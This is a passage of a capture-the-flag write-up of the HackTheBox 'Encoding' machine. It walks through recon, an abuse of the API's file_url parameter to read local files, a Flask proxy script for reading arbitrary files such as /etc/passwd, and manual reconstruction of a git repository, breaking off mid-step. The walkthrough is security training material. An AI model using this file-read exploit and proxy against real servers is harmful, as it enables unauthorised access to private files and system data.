---
title: HTB: Encoding
url: https://0xdf.gitlab.io/2023/04/15/htb-encoding.html
date: 2023-04-15T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-encoding, ctf, nmap, php, file-read, lfi, feroxbuster, wfuzz, subdomain, ssrf, filter, php-filter-injection, youtube, source-code, git, git-manual, gitdumper, python, flask, proxy, uri-structure, burp, burp-repeater, git-hooks, systemd, service, chatgpt, parse_url, htb-updown
---

![Encoding](/img/encoding-cover.png)

Encoding centered around a web application where I’ll first identify a file read vulnerability, and leverage that to exfil a git repo from a site that I can’t directly access. With that repo, I’ll identify a new web URL that has a local file include vulnerability, and leverage a server-side request forgery to hit that and get execution using php filter injection. To get to the next user I’ll install a malicious git hook. That user is able to create and start services, which I’ll abuse to get root. In Beyond root, I’ll look at an SSRF that worked for IppSec but not me, and show how we troubleshot it to find some unexpected behavior from the PHP `parse_url` function.

## Box Info

| Name | [Encoding](https://hackthebox.com/machines/encoding)  [Encoding](https://hackthebox.com/machines/encoding) [Play on HackTheBox](https://hackthebox.com/machines/encoding) |
| --- | --- |
| Release Date | [28 Jan 2023](https://twitter.com/hackthebox_eu/status/1618640023208828933) |
| Retire Date | 15 Apr 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Encoding |
| Radar Graph | Radar chart for Encoding |
| First Blood User | 00:56:52[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:59:15[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.198
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 21:05 EDT
Nmap scan report for 10.10.11.198
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.198
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 21:06 EDT
Nmap scan report for 10.10.11.198
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: HaxTables
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

### Website - TCP 80

#### Site

The site is called HaxTables:

![image-20230409210838407](/img/image-20230409210838407.png)

It describes itself as:

> Free online String and Number converter. Just load your input and they will automatically get converted to selected format. A collection of useful utilities for working with String and Integer values. All are simple, free and easy to use. There are no ads, popups or other garbage!

The “About us” link doesn’t go anywhere. The “Convertions” is a drop-down menu:

![image-20230409210943019](/img/image-20230409210943019.png)

The “Images” link just leads to a page that says “Coming soon!”. The “String” and “Integer” links lead to very similar pages that take some input text and allow the user to select a conversion:

![image-20230409211135006](/img/image-20230409211135006.png)

It does what would be expected:

![image-20230409211229540](/img/image-20230409211229540.png)

The “API” link have a page with a bunch of examples for interacting with the API at `api.haxtables.htb`:

[![image-20230409211601168](/img/image-20230409211601168.png)](/img/image-20230409211601168.png)

[*Click for full image*](/img/image-20230409211601168.png)

The examples are all Python examples using the [Requests](https://requests.readthedocs.io/en/latest/) module to interact with the endpoints.

#### Tech Stack

The URLs show that this page is written in PHP. In fact, it’s using a common PHP pattern, where each page is of the form `http://10.10.11.198/index.php?page=api`. If `page=string`, it loads the string conversions page. Similarly with `page=integer` and `page=image`.

`index.php` is almost certainly taking the `page` parameter manipulating it by filtering, prepending a path, and appending `.php`.

Sometimes it’s possible to access these files directly by visiting something like `http://10.10.11.198/image.php`, but it returns 404 not found. `/includes.image.php` also is 404. It turns out the page is `/includes/image.html` and that is accessible, but it’s not important to know that.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.198 -x php 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.198
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://10.10.11.198/includes => http://10.10.11.198/includes/
200      GET       48l      137w     1999c http://10.10.11.198/index.php
200      GET       31l       80w     1019c http://10.10.11.198/assets/js/main.js
301      GET        9l       28w      313c http://10.10.11.198/assets => http://10.10.11.198/assets/
200      GET      167l      329w     3025c http://10.10.11.198/assets/css/main.css
200      GET     2206l    13654w  1120123c http://10.10.11.198/assets/img/index.png
200      GET       48l      137w     1999c http://10.10.11.198/
200      GET        5l       53w      375c http://10.10.11.198/includes/
200      GET        1l        2w       38c http://10.10.11.198/handler.php
[####################] - 2m     86041/86041   0s      found:9       errors:428    
[####################] - 2m     43008/43008   279/s   http://10.10.11.198/ 
[####################] - 2m     43008/43008   279/s   http://10.10.11.198/includes/ 
[####################] - 0s     43008/43008   0/s     http://10.10.11.198/assets/ => Directory listing
[####################] - 1s     43008/43008   0/s     http://10.10.11.198/assets/img/ => Directory listing
[####################] - 0s     43008/43008   0/s     http://10.10.11.198/assets/js/ => Directory listing
[####################] - 0s     43008/43008   0/s     http://10.10.11.198/assets/css/ => Directory listing

```

Nothing new or interesting here.

Before version 2.9.3 of `feroxbuster`, I’ll need to explicitly filter 404 and 403 to get rid of a ton of noise (`-C 403,404`). It turns out that non-existent pages ending in `.php` return different 404 pages (9 lines) than non-existent pages without an extension (1 line), so the auto filtering doesn’t filter the `.php` 404s. Within a day of tipping off epi, [the v2.9.3 release](https://github.com/epi052/feroxbuster/releases/tag/v2.9.3) fixed the autofilter!

#### API Calls

When I click submit on one of the forms, there’s JavaScript in the page that sends a request to `/handler.php`. The JavaScript invoked is the `make_req` function:

```

function make_req() {
    var ele = document.getElementsByClassName('selectopt');
              
    for(i = 0; i < ele.length; i++) {
        if(ele[i].checked)
        var action = ele[i].value;
    }

    var data = document.getElementById("data").value;
    var uri_path = document.getElementById("uri_path").value;

    var xmlhttp = new XMLHttpRequest(); 
    var theUrl = "/handler.php";
    xmlhttp.open("POST", theUrl);
    xmlhttp.responseType = 'json';
    xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xmlhttp.send(JSON.stringify({ 
        "action": action,
        "data": data,
        "uri_path" : uri_path 
    }));

    xmlhttp.onload = function() {
        let responseObj = xmlhttp.response;
        if (typeof responseObj.data === 'undefined') {
            document.getElementById('data_out').value = responseObj.message;
        } else {
            document.getElementById('data_out').value = responseObj.data;
        }
      };
}

```

This generates a POST request to `/handler.php` that looks like:

```

POST /handler.php HTTP/1.1
Host: 10.10.11.198
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 69
Origin: http://10.10.11.198
Connection: close
Referer: http://10.10.11.198/index.php?page=string

{"action":"md5","data":"0xdf was here","uri_path":"/v3/tools/string"}

```

I’ll note that a path is being sent in the request as something I might mess with.

### Subdomain Brute Force

Given the use of `api.haxtables.htb`, I’ll brute force for any additional subdomains that may be in use. Originally I’ll start it without a filter, and notice that the default case is 1999 characters:

```

oxdf@hacky$ wfuzz -u http://10.10.11.198 -H "Host: FUZZ.haxtables.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.198/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        48 L     137 W      1999 Ch     "www"
000000042:   200        48 L     137 W      1999 Ch     "static"
000000041:   200        48 L     137 W      1999 Ch     "dns1"
000000015:   200        48 L     137 W      1999 Ch     "ns"
000000003:   200        48 L     137 W      1999 Ch     "ftp"
000000043:   200        48 L     137 W      1999 Ch     "lists"
000000031:   200        48 L     137 W      1999 Ch     "mobile"
000000040:   200        48 L     137 W      1999 Ch     "ns4"
000000007:   200        48 L     137 W      1999 Ch     "webdisk"
^C

```

The default case seems to be 1999 characters, so running with `--hh 1999` will hide those responses and show anything different:

```

oxdf@hacky$ wfuzz -u http://10.10.11.198 -H "Host: FUZZ.haxtables.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1999
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.198/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000051:   200        0 L      0 W        0 Ch        "api"
000000177:   403        9 L      28 W       284 Ch      "image"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 0

```

It finds one more, `image.haxtables.htb`. I’lll add all of these to my `/etc/hosts` file:

```
10.10.11.198 haxtables.htb api.haxtables.htb image.haxtables.htb

```

### image.haxtables.htb - TCP 80

Visiting `http://image.haxtables.htb` returns an Apache 403 Forbidden page.

`feroxbuster` doesn’t find anything.

This seems like a dead end for now. It could be filtering based on my IP, or I might need to know a path on the virtual host. Either way, once I get a shell or a way to make requests from the host I’ll come back.

### api.haxtables.htb - TCP 80

#### Documentation

The root `api.haxtables.htb` returns an empty response. However, the API page on the main site has documentation about the API. This is not a very realistic looking API, but perhaps it fits the toy website on this box.

The documentation gives the following endpoints:
- POST to `/v3/tools/string/index.php` - takes an `action` and `data`, where `action` defines the string conversion requested to be performed on `data`.
- POST to `/v3/tools/integer/index.php` - same as `string`, taking an `action` and `data`.

Both endpoints can also handle requests sent as form data and with a `file_url` instead of the data to be encoded.

#### Form Data

I went down a bit of a rabbit hole looking at the form data - This section isn’t important for solving the box.

The example uses both `data` :

```

data = {'action': 'str2hex'}
f = {'data_file' : open('/tmp/data.txt', 'rb')}
response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', data=data, files=f)

```

`files` in a `requests` request tells it to send it as multipart form data. The HTTP request will define a `boundary` in the `Content-Type` header, and then have sections divided by that `boundary` string, each with some metadata and then the data.

In this example, for some reason they put part of it in as `data` and part as `files`. `requests` will combine `data` and `files` and handle them all like files (though the `action` doesn’t get a `filename` metadata entry):

```

POST /v3/tools/string/index.php HTTP/1.1
Host: api.haxtables.htb
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 249
Content-Type: multipart/form-data; boundary=1c2d49b3b9286f33ea5a1aeb8e8e3843
--1c2d49b3b9286f33ea5a1aeb8e8e3843
Content-Disposition: form-data; name="action"

str2hex
--1c2d49b3b9286f33ea5a1aeb8e8e3843
Content-Disposition: form-data; name="data_file"; filename="temp"

temp data
--1c2d49b3b9286f33ea5a1aeb8e8e3843--

```

This is weird, but not important for solving the box.

#### URL

The last example shows giving a URL instead of data:

```

import requests

json_data = {
    'action': 'str2hex',
     'file_url' : 'http://example.com/data.txt'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)

```

I’ll create a simple text file named `test.txt` and host it with a Python webserver. I’ll send the URL for that file to this endpoint:

```

>>> json_data = {"action": "str2hex", "file_url": "http://10.10.14.6/test.txt"}
>>> resp = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)

```

It works. It gets a 200 response. There is also a hit on my webserver:

```
10.10.11.198 - - [11/Apr/2023 14:31:47] "GET /test.txt HTTP/1.1" 200 -

```

The response body shows the returned data, hex-encoded:

```

>>> resp.json()
{'data': '746573740a'}

```

I’ll use `xxd` to verify this is the same data:

```

oxdf@hacky$ echo "746573740a" | xxd -r -p
test

```

#### Brute Force

I’ll run `feroxbuster` on this site as well. I typically run with `-m GET,POST` for APIs, but it doesn’t show anything additional here, so for the sake of cleanliness, I’ll show just GET requests. I also typically wouldn’t include an extension for an API, but I’ve already seen this one has `.php` extensions:

```

oxdf@hacky$ feroxbuster -u http://api.haxtables.htb -x php 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.haxtables.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        0l        0w        0c http://api.haxtables.htb/
200      GET        0l        0w        0c http://api.haxtables.htb/index.php
200      GET        0l        0w        0c http://api.haxtables.htb/utils.php
301      GET        9l       28w      319c http://api.haxtables.htb/v2 => http://api.haxtables.htb/v2/
200      GET        0l        0w        0c http://api.haxtables.htb/v2/header.php
200      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/index.php
301      GET        9l       28w      325c http://api.haxtables.htb/v2/tools => http://api.haxtables.htb/v2/tools/
301      GET        9l       28w      319c http://api.haxtables.htb/v1 => http://api.haxtables.htb/v1/
301      GET        9l       28w      319c http://api.haxtables.htb/v3 => http://api.haxtables.htb/v3/
200      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/
200      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/string/index.php
200      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/string/index.php
301      GET        9l       28w      332c http://api.haxtables.htb/v1/tools/string => http://api.haxtables.htb/v1/tools/string/
301      GET        9l       28w      333c http://api.haxtables.htb/v1/tools/integer => http://api.haxtables.htb/v1/tools/integer/
301      GET        9l       28w      333c http://api.haxtables.htb/v3/tools/integer => http://api.haxtables.htb/v3/tools/integer/
200      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/integer/index.php
200      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/integer/index.php
301      GET        9l       28w      332c http://api.haxtables.htb/v3/tools/string => http://api.haxtables.htb/v3/tools/string/
200      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/string/
200      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/integer/
200      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/integer/
200      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/string/
200      GET        0l        0w        0c http://api.haxtables.htb/v1/tools/string/utils.php
200      GET        0l        0w        0c http://api.haxtables.htb/v1/tools/integer/utils.php
200      GET        0l        0w        0c http://api.haxtables.htb/v3/tools/string/utils.php
301      GET        9l       28w      332c http://api.haxtables.htb/v2/tools/string => http://api.haxtables.htb/v2/tools/string/
200      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/string/
[####################] - 5m    301089/301089  0s      found:27      errors:180117 
[####################] - 3m     43008/43008   189/s   http://api.haxtables.htb/ 
[####################] - 0s     43008/43008   0/s     http://api.haxtables.htb/v2/ => Directory listing
[####################] - 3m     43008/43008   187/s   http://api.haxtables.htb/v2/tools/ 
[####################] - 0s     43008/43008   0/s     http://api.haxtables.htb/v1/ => Directory listing
[####################] - 0s     43008/43008   0/s     http://api.haxtables.htb/v3/ => Directory listing
[####################] - 0s     43008/43008   0/s     http://api.haxtables.htb/v1/tools/ => Directory listing
[####################] - 0s     43008/43008   0/s     http://api.haxtables.htb/v3/tools/ => Directory listing
[####################] - 3m     43008/43008   186/s   http://api.haxtables.htb/v1/tools/string/ 
[####################] - 3m     43008/43008   186/s   http://api.haxtables.htb/v1/tools/integer/ 
[####################] - 3m     43008/43008   185/s   http://api.haxtables.htb/v3/tools/string/ 
[####################] - 3m     43008/43008   185/s   http://api.haxtables.htb/v3/tools/integer/ 
[####################] - 3m     43008/43008   191/s   http://api.haxtables.htb/v2/tools/string/ 

```

One thing that immediately jumped out is that not only `/v3`, but `/v1` and `/v2` seem to exist with the same endpoints. This is really just a rabbit hole.

## Shell as www-data

### File Read

#### Enumerate Requests

I’m curious to see how the PHP server is making the request to get the file from a given URL. I’ll use `nc` to listen on 80 and get it to make the same request to me again:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.198 56144
GET /test.txt HTTP/1.1
Host: 10.10.14.6
Accept: */*

```

No User-Agent string.

#### SSRF [Fail…Sort Of]

I wasn’t able to read anything from `image.haxtables.htb` from my host. It’s worth trying to see if I can reach it via the website functionality. If I can exploit anything there, that would be a server-side request forgery (SSRF).

Unfortunately, it replies that `http://127.0.0.1/index.php` is an “Unacceptable URL”:

```

>>> json_data = {"action": "str2hex", "file_url": "http://127.0.0.1/index.php"}
>>> resp = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
>>> resp.json()
{'message': 'Unacceptable URL'}

```

I’ll check `http://image.haxtables.htb` as well, with the same result:

```

>>> json_data = {"action": "str2hex", "file_url": "http://image.haxtables.htb/"}
>>> resp = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
>>> resp.json()
{'message': 'Unacceptable URL'}

```

It turns out there’s a bypass here, which I only discovered after solving and chatting about the box with IppSec. I’ll talk about that in [Beyond Root](#beyond-root).

#### Local File Read

Given that the site is parsing URLs, I’ll try the `file://` [scheme](https://blog.hubspot.com/marketing/parts-url) to see if it can read files from disk. It can!

```

>>> json_data = {"action": "str2hex", "file_url": "file:///etc/hostname"}
>>> resp = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
>>> resp.json()
{'data': '656e636f64696e670a'}

```

That decodes to “encoding”, which makes sense as the hostname:

```

>>> bytes.fromhex("656e636f64696e670a").decode()
'encoding\n'

```

#### Make Proxy

I’m going to make a Flask proxy to make reading from the file system easy. I’ll walk through that in [this video](https://www.youtube.com/watch?v=f0m-3P7_bsU):

The final script is [here](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-encoding/proxy.py):

```

#!/usr/bin/env python3

import requests
from flask import Flask, Response

app = Flask(__name__)

@app.route('/<path:file>')
def get_file(file):

    req_data = {"action": "str2hex", "file_url": f"file:///{file}"}
    resp = requests.post("http://api.haxtables.htb/v3/tools/string/index.php", json=req_data)
    return Response(bytes.fromhex(resp.json()['data']), content_type="application/octet-stream")

if __name__ == "__main__":
    app.run(debug=True)

```

When I run it, it listens on port 5000 such that I can do things like this in another terminal:

```

oxdf@hacky$ curl http://127.0.0.1:5000/etc/hostname
encoding
oxdf@hacky$ curl http://127.0.0.1:5000/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin          
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...[snip]...

```

### Filesystem Enumeration

#### Locate Web Roots

With the proxy in place, I’ll start reading files from the filesystem. I’ll see if I can pull the config for Apache, which is by default at `/etc/apache2/sites-enabled/000-default.conf`. It defines three virtual hosts.

The first is the default, with a web root at `/var/www/html`:

```

<VirtualHost *:80>
        ServerName haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
                                         
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>  

```

The second is for the API host, with a root at `/var/www/api`:

```

<VirtualHost *:80>
        ServerName api.haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/api
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

The third is for image, which is rooted at `/var/www/image`:

```

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
                         
        DocumentRoot /var/www/image
                                         
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        #SecRuleEngine On

        <LocationMatch />
                SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
                SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
                SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
                SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
                Header always set Retry-After "10" env=RATELIMITED
        </LocationMatch>     

        ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image> 
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>
</VirtualHost>

```

This server has a bit more defined. The last section sets it so that any host except for localhost is blocked trying to access this server.

#### haxtables.htb

The main site `index.html` has the HTML for the nav bar, and then in the main body has this PHP:

```

<?php 
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    if ($page === 'integer') {
        include('./includes/integer.html');
    } else if ($page === 'string') {
        include('./includes/string.html');
    } else if ($page === 'image') {
        include('./includes/image.html');
    } else if ($page === 'api') {
      include('./includes/api.html');
      } else {
        include('./includes/index.html');
    }
} else {
    include('./includes/index.html');
}
?>

```

This is a safe `include`, as it only includes specific pages.

I noted [above](#api-calls) that conversions were handled by `handler.php`:

```

<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];

    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);

    }

}

$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;

?>

```

This file organizes the user input and passes it to `make_api_call`, which is defined in the included `/var/www/api/utils.php`. The function uses curl to make a request at `api.haxtables.htb`:

```

function make_api_call($action, $data, $uri_path, $is_file = false){
    if ($is_file) {
        $post = [
            'data' => file_get_contents($data),
            'action' => $action,
            'uri_path' => $uri_path
        ];
    } else {
        $post = [
            'data' => $data,
            'action' => $action,
            'uri_path' => $uri_path
        ];
    }
    $ch = curl_init();
    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

```

So the page uses JavaScript to hit another page on the main site, and that site uses PHP to issue a request to the API. The response is passed back to the PHP page and then packaged to send to the user. This is a very odd site flow.

There’s also an SSRF vulnerability in this page which I’ll show below.

#### image.haxtables.htb

The `index.php` on `image.haxtables.htb` is very simple:

```

<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>

```

The HTML page is just static. `utils.php` has a bunch of functions. `get_url_content` is using `curl` to get files from a URL:

```

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

```

The `gethostbyname` check is what blocks me from accessing `localhost` or `127.0.0.1` or `image.haxtables.htb` (I’ll show why this fails in [Beyond Root](#beyond-root)).

Three functions at the bottom are interacting with `git`:

```

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /usr/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}

```

The first thing to look at is the `shell_exec` calls, but it seems that no user input is used to form the commands, so there’s not command execution there. It is interesting to note for later that the user running the webserver is able to run `sudo` as svc for these commands without a password. I’ll come back to `git-commit.sh` as well.

This script also suggests there is a Git repository here.

```

oxdf@hacky$ curl http://localhost:5000/var/www/image/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true

```

It’s there.

#### Download Repo Manually

The author’s intended path is to rebuild the repo manually using the file read vulnerability. [This man page](https://git.seveas.net/manpages/gitrepository-layout.html) shows the layout of a Git repo. I’ll start in an empty directory initializing the repo:

```

oxdf@hacky$ git init
Initialized empty Git repository in ~/hackthebox/encoding-10.10.11.198/git-manual/.git/

```

I’ll add `config` and `HEAD`:

```

oxdf@hacky$ curl -s http://localhost:5000/var/www/image/.git/config > .git/config
oxdf@hacky$ curl -s http://localhost:5000/var/www/image/.git/HEAD | tee .git/HEAD
ref: refs/heads/master

```

Knowing the HEAD, I’ll fetch the file in `refs/heads/[branch name]` that will give the “tip-of-the-tree” commit:

```

oxdf@hacky$ mkdir -p .git/refs/heads
oxdf@hacky$ curl -s http://localhost:5000/var/www/image/.git/refs/heads/master | tee .git/refs/heads/master
9c17e5362e5ce2f30023992daad5b74cc562750b

```

I’m using `tee` to both see the contents of the file and save the file into my repo. The commit is a SHA1 hash, and the associated objects will be in `.git/objects/[first two char of sha1]/[rest of sha1]`:

```

oxdf@hacky$ curl -s http://localhost:5000/var/www/image/.git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b | tee .git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b
xA
0=,&m           nii`ʺ,ZAPH:S(\:Q:Of*/gIHy$
Qb_bhZi6G)?'W;'a>gf
i;/ҒE/

```

The results are not obvious. That’s because they are [zlib compressed](https://matthew-brett.github.io/curious-git/reading_git_objects.html). That article shows up to decompress them with Python:

```

oxdf@hacky$ python
Python 3.11.2 (main, Feb  8 2023, 14:49:25) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import zlib 
>>> with open('.git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b', 'rb') as f:
...     compressed_contents = f.read()
... 
>>> decompressed_contents = zlib.decompress(compressed_contents)
>>> print(decompressed_contents.decode())
commit 219tree 30617cae3686895c80152d93a0568e3d0b6a0c49
parent a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
author james <james@haxtables.htb> 1668104210 +0000
committer james <james@haxtables.htb> 1668104210 +0000

Updated scripts!

```

Alternatively, there’s a `git` subcommand, `cat-file` ([docs](https://git-scm.com/docs/git-cat-file), that will do this:

```

oxdf@hacky$ git cat-file -p 9c17e5362e5ce2f30023992daad5b74cc562750b
tree 30617cae3686895c80152d93a0568e3d0b6a0c49
parent a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
author james <james@haxtables.htb> 1668104210 +0000
committer james <james@haxtables.htb> 1668104210 +0000

Updated scripts!

```

This object is built with a reference to another object, `30617cae3686895c80152d93a0568e3d0b6a0c49`. I’ll need to get that on into place using the same method:

```

oxdf@hacky$ mkdir .git/objects/30
oxdf@hacky$ curl -s http://localhost:5000/var/www/image/.git/objects/30/617cae3686895c80152d93a0568e3d0b6a0c49 > .git/objects/30/617cae3686895c80152d93a0568e3d0b6a0c49
oxdf@hacky$ git cat-file -p 30617cae3686895c80152d93a0568e3d0b6a0c49
